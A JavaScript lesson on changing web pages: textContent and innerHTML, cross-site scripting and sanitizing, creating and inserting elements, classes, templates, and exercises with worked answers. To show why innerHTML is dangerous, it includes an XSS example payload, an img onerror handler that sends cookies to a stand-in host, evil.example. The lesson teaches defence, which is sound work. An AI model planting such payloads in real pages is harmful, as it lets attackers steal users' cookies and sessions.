# Lesson 27: Changing the page

**You'll learn:** textContent for text, innerHTML and cross-site scripting, setHTML and sanitizing, createElement, append, prepend, before, after, replaceWith, replaceChildren and remove, moving and cloning elements, attributes versus properties, boolean attributes (hidden, disabled), classList add, remove, toggle and contains, inline styles and CSS custom properties, template elements, building lists in one update, layout thrashing.

▶ **Practise this lesson in the [sandbox](https://kishoremadanagopal.github.io/learning/javascript/#changing-the-page)**: run every example and check your exercise answers.

## Key terms

- **`innerHTML`:** an element's content as HTML text; setting it parses the string as HTML.
- **Cross-site scripting (XSS):** an attack where data inserted as HTML runs the attacker's code in your page.
- **Sanitize:** remove dangerous parts (scripts, event handlers) from HTML before inserting it.
- **`createElement`:** makes a new element that isn't in the page until you insert it.
- **`replaceChildren`:** replaces all of an element's children with the given nodes (or none).
- **Boolean attribute:** an attribute that's on when present, whatever its value, like `disabled` or `hidden`.
- **`classList`:** an element's classes, with `add`, `remove`, `toggle` and `contains`.
- **`<template>`:** HTML that isn't shown, kept to be cloned with `content.cloneNode(true)`.
- **Layout thrashing:** forcing the browser to recalculate layout repeatedly by mixing page changes and layout reads.

Reading the page is half the story. Most front-end code **changes** it: shows a cart, marks an item sold out, hides a message. All of that is done by changing the DOM; the browser redraws the screen for you.

## Text: textContent, and the trouble with innerHTML

Set `textContent` to replace everything inside an element with **plain text**. `innerHTML` instead **parses** the string as HTML:

```html
<p id="a"></p>
<p id="b"></p>
<script>
  const name = "<b>Bell</b> & <i>light</i>";
  document.querySelector("#a").textContent = name;     // shown exactly as written
  document.querySelector("#b").innerHTML = name;       // parsed: bold and italic elements
  console.log(document.querySelector("#a").innerHTML); // the special characters were escaped
  console.log(document.querySelector("#b").children.length);
</script>
```

Parsing is exactly what makes `innerHTML` dangerous. Suppose a product review comes from a user:

```js
const review = '<img src="x" onerror="sendCookiesTo(\'evil.example\')">';
reviewBox.innerHTML = review;     // the image fails to load, and the attacker's code runs on YOUR page
reviewBox.textContent = review;   // safe: the text is shown, nothing runs
```

This is **cross-site scripting (XSS)**, one of the most common web security bugs: the attacker's code runs with your page's access to its users' data. The rules:

- Put **any data you didn't write yourself** (user input, API responses, URL parameters, LLM output) into the page with `textContent`, or by creating elements (below).
- Use `innerHTML` only with HTML **you wrote**, with no data mixed in.
- If you really must show user-written HTML, sanitize it. The new `el.setHTML(html)` removes scripts and event-handler attributes before inserting; it shipped in Firefox 148 and Chrome and Edge 146 in early 2026, but not yet in every browser, so check before relying on it, or use a library such as DOMPurify.

Frameworks such as React, Vue and Svelte escape text automatically for the same reason.

## Creating and inserting elements

`document.createElement(tag)` makes a new, detached element; it appears only when you insert it.

```html
<ul id="cart"><li>Bell</li></ul>
<script>
  const cart = document.querySelector("#cart");

  const li = document.createElement("li");
  li.textContent = "Floor pump";
  li.dataset.id = "4";
  cart.append(li);                                   // last child

  const first = document.createElement("li");
  first.textContent = "Inner tube";
  cart.prepend(first);                               // first child

  cart.append("plain text works too");               // strings become text nodes
  console.log([...cart.children].map((el) => el.textContent));

  li.remove();                                       // take it out of the page
  console.log(cart.children.length);
</script>
```

| Method | Puts the new nodes |
|---|---|
| `parent.append(a, b, …)` | at the end, inside `parent` |
| `parent.prepend(…)` | at the start, inside `parent` |
| `el.before(…)` / `el.after(…)` | just before / after `el`, as siblings |
| `el.replaceWith(…)` | in place of `el` |
| `parent.replaceChildren(…)` | instead of everything in `parent` (no arguments: empties it) |
| `el.remove()` | removes `el` |

An element can only be in one place: appending an element that's already in the page **moves** it. `el.cloneNode(true)` makes a copy (`true` copies its children too).

## Attributes, properties and state

Most attributes have a matching property, and properties are usually what you want:

```html
<button id="buy" class="btn">Add to cart</button>
<p id="msg" hidden>Added!</p>
<script>
  const buy = document.querySelector("#buy");
  buy.disabled = true;                          // a property: true/false
  console.log(buy.outerHTML);                   // the disabled attribute appeared
  buy.disabled = false;

  buy.setAttribute("aria-label", "Add the bell to your cart");   // any attribute
  console.log(buy.getAttribute("aria-label"));
  buy.removeAttribute("aria-label");

  const msg = document.querySelector("#msg");
  msg.hidden = false;                           // show it (hidden = true hides it)
  console.log(msg.hidden, msg.textContent);
</script>
```

`hidden`, `disabled`, `checked` and `selected` are **boolean attributes**: present means on, absent means off. Set them through their properties (`buy.disabled = true`); `setAttribute("disabled", "false")` would *disable* the button, because the attribute is present.

## Classes and styles

Keep the look in CSS and switch **classes** from JavaScript; it's tidier than setting styles one by one, and a designer can change the CSS without touching your code.

```html
<style>
  .card { padding: 8px; border: 1px solid #ccc; }
  .sold-out { opacity: .5; }
  .selected { outline: 3px solid teal; }
</style>
<div class="card" id="tyre">Tubeless tyre</div>
<script>
  const tyre = document.querySelector("#tyre");
  tyre.classList.add("sold-out");
  tyre.classList.toggle("selected");                   // add if missing, remove if present
  console.log(tyre.className);
  tyre.classList.toggle("selected", false);            // with a second argument: force on or off
  console.log(tyre.classList.contains("selected"));
  tyre.style.backgroundColor = "#fff4e0";              // CSS property names become camelCase
  tyre.style.setProperty("--accent", "teal");          // CSS custom properties keep their name
  console.log(tyre.getAttribute("style"));
</script>
```

Use `style` for values that really are computed, like a progress bar's width; use classes for states like "selected" or "sold out".

## Templates

For anything bigger than one element, write the HTML once in a `<template>`. Its content isn't shown; you clone it for each item and fill in the blanks:

```html
<template id="row">
  <li class="product"><span class="name"></span> <b class="price"></b></li>
</template>
<ul id="list"></ul>
<script>
  const products = [{ name: "Bell", price: 800 }, { name: "Floor pump", price: 3200 }];
  const template = document.querySelector("#row");
  const items = products.map((p) => {
    const li = template.content.firstElementChild.cloneNode(true);
    li.querySelector(".name").textContent = p.name;              // still textContent: safe
    li.querySelector(".price").textContent = `£${(p.price / 100).toFixed(2)}`;
    return li;
  });
  document.querySelector("#list").replaceChildren(...items);     // one update to the page
  console.log(document.querySelector("#list").children.length);
</script>
```

`template.content` is a document fragment holding the template's nodes; `firstElementChild.cloneNode(true)` copies the `<li>` with everything inside.

## Update the page in one go

Each change to the page can make the browser recalculate the layout. Building all the new elements first and inserting them once (`replaceChildren(...items)` or `append(...items)`) is simpler and faster than inserting them one by one into a visible list. Also avoid alternating writes with layout reads such as `el.offsetHeight` inside a loop, which forces a recalculation on every read (**layout thrashing**).

## At a glance

| Concept | Approach | Time | Space |
|---|---|---|---|
| Show outside data | el.textContent = value | O(length) | O(length) |
| Render a list | build elements, then parent.replaceChildren(...items) | O(n) | O(n) |
| Switch a visual state | el.classList.toggle(name, condition) | O(1) | O(1) |
| Repeat a block of markup | clone a template's content and fill it | O(size of block) | O(size of block) |

## Common mistakes

- Putting user or API data into `innerHTML`.
- Using `innerHTML +=` to add items, which re-parses everything and duplicates on re-render.
- Setting `setAttribute("disabled", "false")` and expecting the element to be enabled.
- Styling with many inline `style` assignments instead of toggling a class.
- Appending a template's `content` directly, which empties the template after the first use.

## Exercises

### 1. Render the cart

Write `function renderCart(items)` that shows the cart in the page. `items` is an array of `{ name, qty, price }` (price in pence).

- Replace everything in `<ul id="cart">` with one `<li>` per item, with the text `Bell x 2: £16.00` (name, `x`, quantity, `:`, then price × qty in pounds with 2 decimals).
- If the cart is empty, show a single `<li class="empty">Your cart is empty</li>`.
- Set the text of `<p id="total">` to `Total: £` plus the total in pounds with 2 decimals.

Names come from users, so they must appear as text, never as HTML. Calling `renderCart` again must replace the list, not add to it.

Starter code:

```html
<!doctype html>
<html lang="en">
<body>
  <h2>Your cart</h2>
  <ul id="cart"></ul>
  <p id="total"></p>

  <script>
    function renderCart(items) {
      // your code here
    }

    renderCart([{ name: "Bell", qty: 2, price: 800 }, { name: "Inner tube", qty: 1, price: 600 }]);
  </script>
</body>
</html>
```

<details>
<summary>🧭 How to approach it</summary>

1. **Understand:** turn data into elements, replace the old ones, show a total; empty cart is a special case.
2. **Examples:** `[]` → one "Your cart is empty" line and £0.00; a name with `<b>` → shown literally.
3. **Brute force:** `cart.innerHTML += "<li>" + name + …`: duplicates on the second call and lets names inject HTML.
4. **Pattern:** **render from data**: build the elements from the array, then replace the container's children.
5. **Plan:** map items → `<li>`s → add the empty line if needed → `replaceChildren` → total with `reduce` → set `#total`.
6. **Code and test:** call it twice with different carts, then with `[]`.

</details>

<details>
<summary>💡 Hint 1</summary>

For each item, `document.createElement("li")`, then set its `textContent` to the line. Building the text with a template literal is fine because `textContent` never parses it.

</details>

<details>
<summary>💡 Hint 2</summary>

`(pence / 100).toFixed(2)` gives `"16.00"`. A small `pounds(pence)` helper keeps it in one place.

</details>

<details>
<summary>💡 Hint 3</summary>

Finish with `cart.replaceChildren(...lines)`, which removes the old lines and inserts the new ones in one step. Add the `empty` line when there are no items.

</details>

### 2. Product cards from a template

The page has a `<template id="card-tpl">` for one product card and an empty `<div id="grid">`. Write `function renderCards(products)` that fills the grid with one card per product (each `{ id, name, price, stock }`, price in pence):

- clone the template's `<article>` for each product;
- set `.name` to the name and `.price` to the price in pounds, like `£6.00`;
- set the article's `data-id` attribute to the product's id;
- if `stock` is 0, add the class `sold-out` to the article, disable its `.buy` button and change the button's text to `Sold out`.

Calling it again must replace the cards.

Starter code:

```html
<!doctype html>
<html lang="en">
<head>
  <style>
    #grid { display: flex; gap: 8px; flex-wrap: wrap; font-family: system-ui, sans-serif; }
    .card { border: 1px solid #ccc; border-radius: 8px; padding: 8px 12px; }
    .sold-out { opacity: .5; }
  </style>
</head>
<body>
  <template id="card-tpl">
    <article class="card">
      <h3 class="name"></h3>
      <p class="price"></p>
      <button class="buy">Add to cart</button>
    </article>
  </template>
  <div id="grid"></div>

  <script>
    function renderCards(products) {
      // your code here
    }

    renderCards([
      { id: 1, name: "Inner tube", price: 600, stock: 42 },
      { id: 3, name: "Tubeless tyre", price: 4500, stock: 0 },
    ]);
  </script>
</body>
</html>
```

<details>
<summary>🧭 How to approach it</summary>

1. **Understand:** one card per product, from a template, with a sold-out state.
2. **Examples:** stock 0 → faded card, disabled "Sold out" button; 450 pence → "£4.50".
3. **Brute force:** building each card's HTML in a string with the name inside: unsafe and duplicates the template.
4. **Pattern:** **template + clone + fill**, then a single `replaceChildren`.
5. **Plan:** find the template once → map products to filled clones → apply the sold-out state → replace the grid's children.
6. **Code and test:** render twice; try a product name with `<` in it.

</details>

<details>
<summary>💡 Hint 1</summary>

`template.content.firstElementChild.cloneNode(true)` gives you a fresh `<article>` with everything inside it.

</details>

<details>
<summary>💡 Hint 2</summary>

Inside the clone, `card.querySelector(".name").textContent = p.name`, and `card.dataset.id = p.id` sets the `data-id` attribute (the number becomes the string `"1"`).

</details>

<details>
<summary>💡 Hint 3</summary>

For sold-out products: `card.classList.add("sold-out")`, then on the button `disabled = true` and `textContent = "Sold out"`. End with `grid.replaceChildren(...cards)`.

</details>

**In the sandbox:** exercises 53–54. Press **Check** to run the hidden tests.

### Answers and walkthroughs

Open these only after a real attempt. Each one explains the solution step by step.

<details>
<summary>✅ 1. Render the cart</summary>

```html
<!doctype html>
<html lang="en">
<body>
  <h2>Your cart</h2>
  <ul id="cart"></ul>
  <p id="total"></p>

  <script>
    const pounds = (pence) => `£${(pence / 100).toFixed(2)}`;

    function renderCart(items) {
      const lines = items.map((item) => {
        const li = document.createElement("li");
        li.textContent = `${item.name} x ${item.qty}: ${pounds(item.price * item.qty)}`;
        return li;
      });
      if (lines.length === 0) {
        const empty = document.createElement("li");
        empty.className = "empty";
        empty.textContent = "Your cart is empty";
        lines.push(empty);
      }
      document.querySelector("#cart").replaceChildren(...lines);
      const total = items.reduce((sum, item) => sum + item.price * item.qty, 0);
      document.querySelector("#total").textContent = `Total: ${pounds(total)}`;
    }

    renderCart([{ name: "Bell", qty: 2, price: 800 }, { name: "Inner tube", qty: 1, price: 600 }]);
  </script>
</body>
</html>
```

**Line by line**

- `pounds` formats pence once, so the lines and the total can't disagree.
- `items.map` creates one `<li>` per item; `textContent` puts the line in as plain text, so `<b>Bold</b>` is displayed, not obeyed.
- For an empty cart, `lines` gets a single `<li class="empty">`.
- `replaceChildren(...lines)` empties the `<ul>` and inserts the new lines: calling `renderCart` twice shows only the second cart.
- `reduce` adds price × qty over the items; for `[]` it returns the starting value 0.

**Trace:** Bell 2 × 800 = 1600 → "Bell x 2: £16.00"; tube 600; total 2200 → "Total: £22.00".

**Common wrong approach:** `cart.innerHTML += \`<li>${item.name}…</li>\``: each call appends instead of replacing, and a name like `<img src=x onerror=…>` would run code in your page.

</details>

<details>
<summary>✅ 2. Product cards from a template</summary>

```html
<!doctype html>
<html lang="en">
<head>
  <style>
    #grid { display: flex; gap: 8px; flex-wrap: wrap; font-family: system-ui, sans-serif; }
    .card { border: 1px solid #ccc; border-radius: 8px; padding: 8px 12px; }
    .sold-out { opacity: .5; }
  </style>
</head>
<body>
  <template id="card-tpl">
    <article class="card">
      <h3 class="name"></h3>
      <p class="price"></p>
      <button class="buy">Add to cart</button>
    </article>
  </template>
  <div id="grid"></div>

  <script>
    const template = document.querySelector("#card-tpl");

    function renderCards(products) {
      const cards = products.map((p) => {
        const card = template.content.firstElementChild.cloneNode(true);
        card.dataset.id = p.id;
        card.querySelector(".name").textContent = p.name;
        card.querySelector(".price").textContent = `£${(p.price / 100).toFixed(2)}`;
        if (p.stock === 0) {
          card.classList.add("sold-out");
          const buy = card.querySelector(".buy");
          buy.disabled = true;
          buy.textContent = "Sold out";
        }
        return card;
      });
      document.querySelector("#grid").replaceChildren(...cards);
    }

    renderCards([
      { id: 1, name: "Inner tube", price: 600, stock: 42 },
      { id: 3, name: "Tubeless tyre", price: 4500, stock: 0 },
    ]);
  </script>
</body>
</html>
```

**Line by line**

- The template is looked up once; `template.content` holds its nodes without showing them.
- `cloneNode(true)` copies the article with its heading, paragraph and button, so the markup lives only in the HTML.
- `card.dataset.id = p.id` creates `data-id="1"`; datasets store strings.
- `textContent` keeps names safe; `toFixed(2)` formats the pounds.
- The sold-out branch changes three things that belong together: class (look), `disabled` (behaviour) and text (meaning, also for screen readers).
- `replaceChildren(...cards)` swaps the old cards for the new ones in one update.

**Trace:** the tyre has stock 0 → `class="card sold-out"`, button disabled with "Sold out"; the others keep "Add to cart".

**Common wrong approach:** cloning `template` itself, or appending `template.content` directly: the first copies the invisible `<template>` element, and the second empties the template after the first use, so the next call has nothing to clone.

</details>

## Quick quiz

1. Which line safely shows a username typed by a visitor?
   - A) el.textContent = username
   - B) el.innerHTML = username
   - C) el.innerHTML = `<b>${username}</b>`

2. What does parent.replaceChildren() with no arguments do?
   - A) Removes all of parent's children
   - B) Nothing
   - C) Throws an error

3. You run button.setAttribute("disabled", "false"). What happens?
   - A) The button is disabled, because the attribute is present
   - B) The button is enabled
   - C) An error is thrown

4. You append an element that is already in the page to another list. What happens?
   - A) It moves to the new place
   - B) A copy is added and the original stays
   - C) An error is thrown

<details>
<summary>Quiz answers</summary>

1. **A) el.textContent = username**: textContent never parses HTML, so nothing in the name can run.
2. **A) Removes all of parent's children**: It replaces the children with nothing; pass elements to replace them with those.
3. **A) The button is disabled, because the attribute is present**: Boolean attributes are on whenever present; use button.disabled = false.
4. **A) It moves to the new place**: An element has one position; use cloneNode(true) for a copy.

</details>

---
Previous: [Lesson 26](26-the-dom.md) · Next: [Lesson 28: Events](28-events.md)
